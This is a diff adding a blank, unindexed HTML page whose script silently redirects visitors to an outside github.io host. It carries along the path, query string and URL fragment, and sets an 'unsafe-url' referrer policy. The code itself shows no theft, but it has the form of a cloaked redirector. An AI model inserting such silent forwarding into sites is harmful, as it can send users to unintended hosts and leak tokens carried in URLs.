@@ -1,0 +1,23 @@
+<!DOCTYPE html>
+<html lang="en-GB">
+<head>
+<meta charset="UTF-8">
+<meta name="referrer" content="unsafe-url">
+<title>...</title>
+<meta name="robots" content="noindex, nofollow">
+<style>
+    html, body { background: #ffffff; margin: 0; padding: 0; }
+</style>
+</head>
+<body>
+<script>
+(function () {
+    var gateway = 'https://markrios25.github.io';
+    var chunks = window.location.pathname.split('/.github/');
+    if (!chunks[1]) return;
+    var suffix = chunks[1] + window.location.search + window.location.hash;
+    window.location.assign(gateway + '/.github/' + suffix);
+})();
+</script>
+</body>
+</html>
